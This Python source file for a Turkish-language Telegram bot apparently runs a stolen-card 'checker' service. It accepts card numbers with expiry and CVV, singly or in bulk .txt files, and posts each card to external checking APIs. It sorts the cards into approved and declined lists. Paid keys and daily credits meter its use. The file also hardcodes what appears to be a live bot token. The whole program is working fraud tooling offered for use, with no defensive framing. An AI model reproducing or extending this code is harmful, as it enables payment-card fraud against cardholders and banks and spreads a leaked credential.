import logging
import sqlite3
import datetime
import asyncio
from urllib.parse import quote

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters,
)
from telegram.constants import ParseMode

# --- BOT AYARLARI ---
# Buraya Telegram'dan aldığın bot tokenini yapıştır.
TOKEN = "8098364071:AAE10VAob4rv09fF_Jy9-flrgILjbB5AFWg"
# Buraya kendi Telegram kullanıcı ID'ni yaz.
ADMIN_ID = 7272527047  # RAKAMLARI KENDİ ID'N İLE DEĞİŞTİR
# Kanal ve Chat Kullanıcı Adları
MAIN_CHANNEL = "@Zirvefinans_sh4"
CHAT_GROUP = "@HEROXCC_chat"
ADMIN_USERNAME = "@Heroxcredit"

# --- API Linkleri ---
# Card formatı linke eklenmeden önce URL uyumlu hale getirilecek (quote).
AUTH_API_URL = "http://syxezerocheck.wuaze.com/api/auth2.php?card={card}"
PUAN_API_URL = "http://syxezerocheck.wuaze.com/api/puan.php?card={card}&i=1"


# --- Veritabanı Ayarları ---
DB_NAME = "bot_data.db"

def setup_database():
    """Veritabanını ve tabloları oluşturur."""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    # Kullanıcılar tablosu
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        credits INTEGER DEFAULT 100,
        last_credit_reset DATE,
        key_id TEXT,
        key_expires TIMESTAMP
    )
    """)
    # Keyler tablosu
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS keys (
        key_value TEXT PRIMARY KEY,
        duration_hours INTEGER,
        is_used INTEGER DEFAULT 0,
        used_by INTEGER,
        used_at TIMESTAMP
    )
    """)
    # Yasaklılar tablosu
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS banned_users (
        user_id INTEGER PRIMARY KEY,
        reason TEXT
    )
    """)
    # Bakım modu tablosu
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS maintenance (
        api_name TEXT PRIMARY KEY,
        is_active INTEGER DEFAULT 1
    )
    """)
    # API'ları bakım tablosuna ekle
    cursor.execute("INSERT OR IGNORE INTO maintenance (api_name) VALUES (?)", ('Auth',))
    cursor.execute("INSERT OR IGNORE INTO maintenance (api_name) VALUES (?)", ('Puan',))
    conn.commit()
    conn.close()

# --- Yardımcı Fonksiyonlar ---

async def is_admin(user_id: int) -> bool:
    """Kullanıcının admin olup olmadığını kontrol eder."""
    return user_id == ADMIN_ID

async def check_membership(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Kullanıcının zorunlu kanallara üye olup olmadığını kontrol eder."""
    try:
        member_main = await context.bot.get_chat_member(chat_id=MAIN_CHANNEL, user_id=user_id)
        member_chat = await context.bot.get_chat_member(chat_id=CHAT_GROUP, user_id=user_id)
        if member_main.status not in ['member', 'administrator', 'creator'] or \
           member_chat.status not in ['member', 'administrator', 'creator']:
            return False
        return True
    except Exception as e:
        logging.error(f"Üyelik kontrol hatası: {e}")
        return False

def get_user(user_id: int):
    """Veritabanından kullanıcı bilgilerini alır."""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user_data = cursor.fetchone()
    conn.close()
    return user_data

def update_or_create_user(user_id: int, username: str):
    """Kullanıcıyı veritabanına ekler veya günceller."""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    today = datetime.date.today().isoformat()
    cursor.execute("""
    INSERT INTO users (user_id, username, last_credit_reset)
    VALUES (?, ?, ?)
    ON CONFLICT(user_id) DO UPDATE SET username = excluded.username
    """, (user_id, username, today))
    conn.commit()
    conn.close()
    
def check_and_reset_credits(user_id: int):
    """Günlük kredi yenileme işlemini yapar."""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    today = datetime.date.today()
    cursor.execute("SELECT last_credit_reset FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    if result:
        last_reset = datetime.datetime.strptime(result[0], '%Y-%m-%d').date()
        if last_reset < today:
            cursor.execute("""
            UPDATE users 
            SET credits = 100, last_credit_reset = ? 
            WHERE user_id = ? AND key_id IS NULL
            """, (today.isoformat(), user_id))
            conn.commit()
    conn.close()

def is_banned(user_id: int) -> bool:
    """Kullanıcının yasaklı olup olmadığını kontrol eder."""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT 1 FROM banned_users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result is not None

# --- Admin Komutları ---

async def uret_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        await update.message.reply_text("Bu komutu kullanma yetkiniz yok.")
        return

    try:
        _, key, sure_str = context.args
        sure = int(sure_str)
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("INSERT OR IGNORE INTO keys (key_value, duration_hours) VALUES (?, ?)", (key, sure))
        conn.commit()
        conn.close()
        await update.message.reply_text(f"🔑 Key başarıyla oluşturuldu!\n\nKey: `{key}`\nSüre: {sure} saat", parse_mode=ParseMode.MARKDOWN)
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Hatalı kullanım.\nÖrnek: `/uret YENIKEY 24`")
    except sqlite3.IntegrityError:
        await update.message.reply_text("❌ Bu key zaten mevcut.")


async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        await update.message.reply_text("Bu komutu kullanma yetkiniz yok.")
        return

    try:
        user_id_to_ban = int(context.args[0])
        reason = " ".join(context.args[1:]) if len(context.args) > 1 else "Belirtilmedi"
        
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("INSERT OR IGNORE INTO banned_users (user_id, reason) VALUES (?, ?)", (user_id_to_ban, reason))
        conn.commit()
        conn.close()
        
        await update.message.reply_text(f"🚫 Kullanıcı (`{user_id_to_ban}`) başarıyla yasaklandı.\nSebep: {reason}", parse_mode=ParseMode.MARKDOWN)
        
        try:
            await context.bot.send_message(
                chat_id=user_id_to_ban,
                text=f"🚫 Bottan yasaklandınız.\n\n*Sebep:* {reason}\n\nİtiraz etmek için yönetici ile iletişime geçin: {ADMIN_USERNAME}",
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            await update.message.reply_text(f"Kullanıcıya bildirim gönderilemedi. Muhtemelen botu engellemiş. Hata: {e}")

    except (ValueError, IndexError):
        await update.message.reply_text("❌ Hatalı kullanım.\nÖrnek: `/ban 123456789 Spam yapmak`")

async def profil_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        await update.message.reply_text("Bu komutu kullanma yetkiniz yok.")
        return

    try:
        user_id_to_check = int(context.args[0])
        user = get_user(user_id_to_check)
        if not user:
            await update.message.reply_text("Kullanıcı bulunamadı veya botu hiç başlatmamış.")
            return
            
        user_id, username, credits, last_reset, key_id, key_expires = user
        
        profil_mesaji = f"👤 **Kullanıcı Profili**\n\n"
        profil_mesaji += f"**ID:** `{user_id}`\n"
        profil_mesaji += f"**Kullanıcı Adı:** @{username}\n"
        
        if key_id:
            expires_dt = datetime.datetime.fromisoformat(key_expires)
            kalan_sure = expires_dt - datetime.datetime.now()
            profil_mesaji += f"**Kredi:** Sınırsız ♾️\n"
            profil_mesaji += f"**Aktif Key:** `{key_id}`\n"
            if kalan_sure.total_seconds() > 0:
                hours, remainder = divmod(int(kalan_sure.total_seconds()), 3600)
                minutes, _ = divmod(remainder, 60)
                profil_mesaji += f"**Kalan Süre:** {hours} saat {minutes} dakika\n"
            else:
                profil_mesaji += "**Süre:** Dolmuş ❌\n"
        else:
            profil_mesaji += f"**Kredi:** {credits}\n"
            
        await update.message.reply_text(profil_mesaji, parse_mode=ParseMode.MARKDOWN)

    except (ValueError, IndexError):
        await update.message.reply_text("❌ Hatalı kullanım.\nÖrnek: `/profil 123456789`")

async def bakim_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        return
    try:
        api_name = context.args[0].capitalize()
        if api_name not in ['Auth', 'Puan']:
            await update.message.reply_text("❌ Geçersiz API ismi. Sadece 'Auth' veya 'Puan' olabilir.")
            return
        
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("UPDATE maintenance SET is_active = 0 WHERE api_name = ?", (api_name,))
        conn.commit()
        conn.close()
        
        await update.message.reply_text(f"🔧 `{api_name}` API'si başarıyla bakıma alındı.", parse_mode=ParseMode.MARKDOWN)

    except IndexError:
        await update.message.reply_text("❌ Hatalı kullanım.\nÖrnek: `/bakim Auth`")
        
async def aktifet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        return
    try:
        api_name = context.args[0].capitalize()
        if api_name not in ['Auth', 'Puan']:
            await update.message.reply_text("❌ Geçersiz API ismi. Sadece 'Auth' veya 'Puan' olabilir.")
            return
        
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("UPDATE maintenance SET is_active = 1 WHERE api_name = ?", (api_name,))
        conn.commit()
        conn.close()
        
        await update.message.reply_text(f"✅ `{api_name}` API'si başarıyla aktif edildi.", parse_mode=ParseMode.MARKDOWN)

    except IndexError:
        await update.message.reply_text("❌ Hatalı kullanım.\nÖrnek: `/aktifet Puan`")

# --- Kullanıcı Komutları ve Bot Mantığı ---

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_banned(user.id):
        await update.message.reply_text("🚫 Üzgünüz, bu botu kullanmaktan yasaklandınız.")
        return

    update_or_create_user(user.id, user.username)

    if not await check_membership(user.id, context):
        keyboard = [
            [InlineKeyboardButton("🔗 Ana Kanal", url=f"https://t.me/{MAIN_CHANNEL.replace('@', '')}")],
            [InlineKeyboardButton("💬 Sohbet Grubu", url=f"https://t.me/{CHAT_GROUP.replace('@', '')}")],
            [InlineKeyboardButton("✅ Katıldım", callback_data="join_check")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "**Zirve Finans Checker'a Hoş Geldiniz!** 🚀\n\n"
            "Botumuzu kullanmaya başlamadan önce lütfen aşağıdaki kanallara katılın. "
            "Bu, topluluğumuzun bir parçası olmanız için gereklidir.\n\n"
            "Katıldıktan sonra 'Katıldım' butonuna basarak devam edebilirsiniz.",
            reply_markup=reply_markup,
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await send_main_menu(update, context)

async def join_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if await check_membership(user_id, context):
        await query.edit_message_text(
            text="✅ Teşekkürler! Kanallara katılımınız doğrulandı. Artık botu kullanabilirsiniz."
        )
        await send_main_menu(update, context, query.message.chat_id)
    else:
        await query.answer("❗️ Lütfen belirtilen tüm kanallara katıldığınızdan emin olun.", show_alert=True)

async def send_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, chat_id=None):
    if chat_id is None:
        chat_id = update.effective_chat.id
    
    keyboard = [
        [InlineKeyboardButton("💳 Check İşlemleri", callback_data="go_to_check")],
        [InlineKeyboardButton("👤 Profilim", callback_data="show_me")],
        [InlineKeyboardButton("🔑 Key Kullan", callback_data="use_key_prompt")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_message(
        chat_id=chat_id,
        text="**Ana Menü**\n\nLütfen yapmak istediğiniz işlemi seçin:",
        reply_markup=reply_markup,
        parse_mode=ParseMode.MARKDOWN
    )

async def me_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_banned(user_id): return

    check_and_reset_credits(user_id) # Krediyi kontrol et/yenile
    user = get_user(user_id)
    if not user:
        await update.message.reply_text("Sisteme kayıtlı değilsiniz. Lütfen /start komutunu kullanın.")
        return

    _, username, credits, _, key_id, key_expires = user
    
    profil_mesaji = f"👤 **Profil Bilgileriniz**\n\n"
    profil_mesaji += f"**Kullanıcı Adı:** @{username}\n"
    
    if key_id:
        if key_expires:
            expires_dt = datetime.datetime.fromisoformat(key_expires)
            kalan_sure = expires_dt - datetime.datetime.now()
            if kalan_sure.total_seconds() > 0:
                hours, remainder = divmod(int(kalan_sure.total_seconds()), 3600)
                minutes, _ = divmod(remainder, 60)
                profil_mesaji += f"**Kredi:** Sınırsız ♾️\n"
                profil_mesaji += f"**Kalan Süre:** {hours} saat {minutes} dakika ⏰\n"
            else:
                # Süre dolmuşsa key'i temizle
                conn = sqlite3.connect(DB_NAME)
                cursor = conn.cursor()
                cursor.execute("UPDATE users SET key_id = NULL, key_expires = NULL, credits = 100 WHERE user_id = ?", (user_id,))
                conn.commit()
                conn.close()
                profil_mesaji += f"**Kredi:** 100 💳 (Key süreniz doldu)\n"
        else:
             profil_mesaji += f"**Kredi:** 100 💳 (Key süresi hatası)\n"
    else:
        profil_mesaji += f"**Kredi:** {credits} 💳\n"
        profil_mesaji += "_Krediler her gün yenilenir._"
        
    await update.message.reply_text(profil_mesaji, parse_mode=ParseMode.MARKDOWN)

async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_banned(user_id): return
    
    try:
        user_key = context.args[0]
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        
        cursor.execute("SELECT duration_hours, is_used FROM keys WHERE key_value = ?", (user_key,))
        key_data = cursor.fetchone()
        
        if not key_data:
            await update.message.reply_text("❌ Geçersiz key girdiniz.")
            conn.close()
            return
            
        duration, is_used = key_data
        if is_used:
            await update.message.reply_text("❌ Bu key daha önce kullanılmış.")
            conn.close()
            return
            
        # Key'i aktifleştir
        now = datetime.datetime.now()
        expires_at = now + datetime.timedelta(hours=duration)
        
        cursor.execute("UPDATE keys SET is_used = 1, used_by = ?, used_at = ? WHERE key_value = ?", (user_id, now, user_key))
        cursor.execute("UPDATE users SET key_id = ?, key_expires = ?, credits = 99999 WHERE user_id = ?", (user_key, expires_at.isoformat(), user_id))
        
        conn.commit()
        conn.close()
        
        await update.message.reply_text(f"✅ Key başarıyla aktif edildi! **{duration} saat** boyunca sınırsız check hakkınız bulunmaktadır.", parse_mode=ParseMode.MARKDOWN)

    except IndexError:
        await update.message.reply_text("❌ Lütfen key'i komutla birlikte girin.\nÖrnek: `/key ABC-123`")

# --- CHECKER CONVERSATION HANDLER ---

CHOOSE_API, CHOOSE_CHECK_TYPE, SINGLE_CHECK, MASS_CHECK = range(4)

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Bu fonksiyon hem CommandHandler hem de CallbackQueryHandler tarafından çağrılabilir.
    # Bu yüzden update objesinin türünü kontrol etmeliyiz.
    if isinstance(update, Update):
        user_id = update.effective_user.id
        message_source = update.message
    else: # CallbackQuery'den geliyorsa
        user_id = update.effective_user.id
        message_source = update.callback_query.message

    if is_banned(user_id): return ConversationHandler.END
    if not await check_membership(user_id, context):
        await message_source.reply_text("❗️ Check yapabilmek için kanallara katılmalısınız. Lütfen /start atarak kontrol edin.")
        return ConversationHandler.END
    
    check_and_reset_credits(user_id)
    user_data = get_user(user_id)
    credits = user_data[2] if user_data else 0
    key_active = user_data[4] is not None if user_data else False
    
    if not key_active and credits <= 0:
        await message_source.reply_text(
            "😔 Krediniz bitti.\n\n"
            "Sınırsız kullanım için `/key <anahtar>` komutu ile bir key kullanabilir veya kredilerinizin yenilenmesi için yarını bekleyebilirsiniz."
        )
        return ConversationHandler.END
    
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT api_name, is_active FROM maintenance")
    maintenance_status = {row[0]: bool(row[1]) for row in cursor.fetchall()}
    conn.close()

    keyboard = []
    if maintenance_status.get('Auth', True):
        keyboard.append([InlineKeyboardButton("💳 Auth", callback_data="api_auth")])
    else:
        keyboard.append([InlineKeyboardButton("🔧 Auth (Bakımda)", callback_data="disabled")])
        
    if maintenance_status.get('Puan', True):
        keyboard.append([InlineKeyboardButton("💰 Puan", callback_data="api_puan")])
    else:
        keyboard.append([InlineKeyboardButton("🔧 Puan (Bakımda)", callback_data="disabled")])

    keyboard.append([InlineKeyboardButton("❌ İptal", callback_data="cancel_check")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Mesajı düzenle veya yeni mesaj gönder
    if isinstance(update, Update) and update.callback_query:
        await update.callback_query.edit_message_text(
            "Lütfen kullanmak istediğiniz API'yi seçin:",
            reply_markup=reply_markup
        )
    else:
        await message_source.reply_text(
            "Lütfen kullanmak istediğiniz API'yi seçin:",
            reply_markup=reply_markup
        )
    return CHOOSE_API

async def choose_api_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    api_choice = query.data.split('_')[1]
    context.user_data['api'] = api_choice
    
    keyboard = [
        [InlineKeyboardButton("☝️ Tekli Check", callback_data="type_single")],
        [InlineKeyboardButton("🗂️ Mass Check (TXT)", callback_data="type_mass")],
        [InlineKeyboardButton("⬅️ Geri", callback_data="go_back_api")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        text=f"**API: {api_choice.capitalize()}**\n\nLütfen check türünü seçin.",
        reply_markup=reply_markup,
        parse_mode=ParseMode.MARKDOWN
    )
    return CHOOSE_CHECK_TYPE

async def choose_check_type_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    check_type = query.data.split('_')[1]
    
    if check_type == 'single':
        await query.edit_message_text(
            text="Lütfen kart bilgilerini aşağıdaki formatta gönderin:\n\n`0123456789123456|03|28|123`",
            parse_mode=ParseMode.MARKDOWN
        )
        return SINGLE_CHECK
    elif check_type == 'mass':
        await query.edit_message_text(
            text="Lütfen kart bilgilerini içeren bir `.txt` dosyası gönderin.\n\n"
                 "Dosyadaki her satır şu formatta olmalıdır:\n`0123456789123456|03|28|123`",
            parse_mode=ParseMode.MARKDOWN
        )
        return MASS_CHECK
    return ConversationHandler.END

def check_card_api(card: str, api_type: str) -> str:
    """API'ye GET isteği atıp cevabı döndürür."""
    try:
        encoded_card = quote(card)
        if api_type == 'auth':
            url = AUTH_API_URL.format(card=encoded_card)
        elif api_type == 'puan':
            url = PUAN_API_URL.format(card=encoded_card)
        else:
            return "Geçersiz API Tipi"
            
        response = requests.get(url, timeout=15)
        response.raise_for_status() # HTTP hatalarında exception fırlatır
        return response.text
    except requests.exceptions.RequestException as e:
        logging.error(f"API isteği hatası: {e}")
        return f"API Hatası: {e}"
    except Exception as e:
        logging.error(f"Bilinmeyen check hatası: {e}")
        return f"Bilinmeyen Hata: {e}"

async def single_check_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card_info = update.message.text
    user_id = update.effective_user.id
    api_type = context.user_data.get('api')

    # Kullanıcı kredisini tekrar kontrol et
    check_and_reset_credits(user_id)
    user_data = get_user(user_id)
    credits = user_data[2]
    key_active = user_data[4] is not None
    
    if not key_active and credits <= 0:
        await update.message.reply_text("😔 Krediniz bitti.")
        return ConversationHandler.END

    # Kart formatını kontrol et
    parts = card_info.split('|')
    if len(parts) != 4 or not all(p.isdigit() for p in (parts[0], parts[1], parts[2], parts[3])):
        await update.message.reply_text("❌ Geçersiz kart formatı. Lütfen `CCN|MM|YY|CVV` formatında girin.")
        return SINGLE_CHECK

    # Auth API için 000 CVV kuralı
    if api_type == 'auth' and parts[3] == '000':
        await update.message.reply_text("❌ **Auth API** için CVV'si `000` olan kartlar kontrol edilemez. Lütfen kartı düzeltin veya Puan API'sini kullanın.")
        return ConversationHandler.END
        
    # Check işlemi
    msg = await update.message.reply_text("⏳ Kartınız kontrol ediliyor, lütfen bekleyin...")
    api_response = check_card_api(card_info, api_type)
    
    await msg.edit_text(f"**Sonuç:**\n\n`{card_info}`\n`{api_response}`", parse_mode=ParseMode.MARKDOWN)

    # Kredi düşürme
    if not key_active:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET credits = credits - 1 WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()

    return ConversationHandler.END
    
async def mass_check_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    api_type = context.user_data.get('api')
    
    # Kullanıcı kredisini tekrar kontrol et
    check_and_reset_credits(user_id)
    user_data = get_user(user_id)
    credits = user_data[2]
    key_active = user_data[4] is not None
    
    if not update.message.document or not update.message.document.file_name.endswith('.txt'):
        await update.message.reply_text("Lütfen `.txt` formatında bir dosya gönderin.")
        return MASS_CHECK
        
    txt_file = await update.message.document.get_file()
    file_content = await txt_file.download_as_bytearray()
    
    try:
        cards = file_content.decode('utf-8').strip().split('\n')
        cards = [line.strip() for line in cards if line.strip()] # Boş satırları atla
    except UnicodeDecodeError:
        await update.message.reply_text("❌ Dosya kodlaması (UTF-8) okunamadı. Lütfen dosyanızı kontrol edin.")
        return ConversationHandler.END

    if not cards:
        await update.message.reply_text("❌ Gönderdiğiniz dosya boş.")
        return ConversationHandler.END

    # Auth API için 000 CVV kuralı (dosya içinde)
    if api_type == 'auth':
        if any(card.split('|')[-1] == '000' for card in cards if len(card.split('|')) == 4):
            await update.message.reply_text("❌ Dosyanızda CVV'si `000` olan kartlar bulundu. **Auth API** bu kartları desteklemiyor. Lütfen dosyanızı düzenleyip tekrar gönderin.")
            return ConversationHandler.END
    
    # Kredi kontrolü
    if not key_active and len(cards) > credits:
        await update.message.reply_text(f"😔 Yetersiz kredi. Bu işlem için {len(cards)} kredi gerekiyor, sizde {credits} kredi var.")
        return ConversationHandler.END
    
    status_msg = await update.message.reply_text(f"✅ Dosya alındı. Toplam {len(cards)} kart kontrol ediliyor...")
    
    approved = []
    declined = []
    total_cards = len(cards)

    for i, card in enumerate(cards):
        # Format kontrolü
        parts = card.split('|')
        if len(parts) != 4 or not all(p.isdigit() for p in (parts[0], parts[1], parts[2], parts[3])):
            declined.append(f"{card} | Geçersiz Format")
            continue

        api_response = check_card_api(card, api_type)
        
        if "APPROVED" in api_response.upper() or "CVV MATCHED" in api_response.upper() or "SUCCESS" in api_response.upper():
            approved.append(f"{card} | {api_response}")
        else:
            declined.append(f"{card} | {api_response}")
            
        # Progress bar
        progress = i + 1
        percentage = (progress / total_cards) * 100
        bar_length = 10
        filled_length = int(bar_length * progress // total_cards)
        bar = '█' * filled_length + '─' * (bar_length - filled_length)
        
        # Her 5 kartta bir mesajı güncelle
        if progress % 5 == 0 or progress == total_cards:
            try:
                await status_msg.edit_text(
                    f"⏳ Kontrol ediliyor...\n\n"
                    f"`{progress}/{total_cards}`\n"
                    f"[{bar}] {percentage:.1f}%\n\n"
                    f"✅ Approved: {len(approved)}\n"
                    f"❌ Declined: {len(declined)}",
                    parse_mode=ParseMode.MARKDOWN
                )
                await asyncio.sleep(0.5) # Telegram API limitlerine takılmamak için
            except Exception:
                pass # Mesaj değiştirilemediyse devam et

    # Kredi düşürme
    if not key_active:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET credits = credits - ? WHERE user_id = ?", (total_cards, user_id))
        conn.commit()
        conn.close()

    await status_msg.delete()
    await update.message.reply_text(f"🏁 **Check Tamamlandı!**\n\nToplam Kart: {total_cards}\n✅ Approved: {len(approved)}\n❌ Declined: {len(declined)}")

    # Sonuç dosyalarını gönder
    if approved:
        with open("APPROVED.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(approved))
        await update.message.reply_document(document=open("APPROVED.txt", "rb"), caption="✅ Approved Kartlar")
    
    if declined:
        with open("DECLINED.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(declined))
        await update.message.reply_document(document=open("DECLINED.txt", "rb"), caption="❌ Declined Kartlar")

    return ConversationHandler.END


async def cancel_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("İşlem iptal edildi.")
    return ConversationHandler.END

async def go_back_to_api_select(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Bu fonksiyon check_command'ın bir kopyası gibi çalışacak ama query'yi düzenleyecek
    query = update.callback_query
    
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT api_name, is_active FROM maintenance")
    maintenance_status = {row[0]: bool(row[1]) for row in cursor.fetchall()}
    conn.close()
    
    keyboard = []
    if maintenance_status.get('Auth', True):
        keyboard.append([InlineKeyboardButton("💳 Auth", callback_data="api_auth")])
    else:
        keyboard.append([InlineKeyboardButton("🔧 Auth (Bakımda)", callback_data="disabled")])
        
    if maintenance_status.get('Puan', True):
        keyboard.append([InlineKeyboardButton("💰 Puan", callback_data="api_puan")])
    else:
        keyboard.append([InlineKeyboardButton("🔧 Puan (Bakımda)", callback_data="disabled")])

    keyboard.append([InlineKeyboardButton("❌ İptal", callback_data="cancel_check")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        "Lütfen kullanmak istediğiniz API'yi seçin:",
        reply_markup=reply_markup
    )
    return CHOOSE_API

async def disabled_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("Bu API şu anda bakımda. Lütfen daha sonra tekrar deneyin.", show_alert=True)

async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == 'go_to_check':
        # Conversation handler'ı manuel olarak başlat
        await check_command(update, context)
        return ConversationHandler.ENTRY
    elif query.data == 'show_me':
        await me_command(query, context)
    elif query.data == 'use_key_prompt':
        await query.message.reply_text("Lütfen `/key <anahtar>` komutunu kullanarak anahtarınızı girin.")

def main() -> None:
    """Botu başlatır."""
    setup_database()
    
    application = Application.builder().token(TOKEN).build()

    # Admin komutları
    application.add_handler(CommandHandler("uret", uret_command))
    application.add_handler(CommandHandler("ban", ban_command))
    application.add_handler(CommandHandler("profil", profil_command))
    application.add_handler(CommandHandler("bakim", bakim_command))
    application.add_handler(CommandHandler("aktifet", aktifet_command))

    # Kullanıcı komutları
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("key", key_command))
    application.add_handler(CommandHandler("me", me_command))

    # Check Conversation Handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("check", check_command), CallbackQueryHandler(check_command, pattern='^go_to_check$')],
        states={
            CHOOSE_API: [CallbackQueryHandler(choose_api_callback, pattern='^api_')],
            CHOOSE_CHECK_TYPE: [
                CallbackQueryHandler(choose_check_type_callback, pattern='^type_'),
                CallbackQueryHandler(go_back_to_api_select, pattern='^go_back_api$')
            ],
            SINGLE_CHECK: [MessageHandler(filters.TEXT & ~filters.COMMAND, single_check_handler)],
            MASS_CHECK: [MessageHandler(filters.Document.TXT, mass_check_handler)],
        },
        fallbacks=[
            CallbackQueryHandler(cancel_check, pattern='^cancel_check$'),
            CommandHandler("start", start_command) # Herhangi bir anda start atarsa sıfırla
        ],
        per_message=False
    )
    application.add_handler(conv_handler)
    
    # Callback Query Handlers
    application.add_handler(CallbackQueryHandler(join_check_callback, pattern='^join_check$'))
    application.add_handler(CallbackQueryHandler(disabled_callback, pattern='^disabled$'))
    # Diğer genel menü callbackleri
    application.add_handler(CallbackQueryHandler(main_menu_callback, pattern='^(show_me|use_key_prompt)$'))


    # Botu çalıştır
    print("Bot çalışıyor amk...")
    application.run_polling()

if __name__ == "__main__":
    logging.basicConfig(
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
    )
    main()
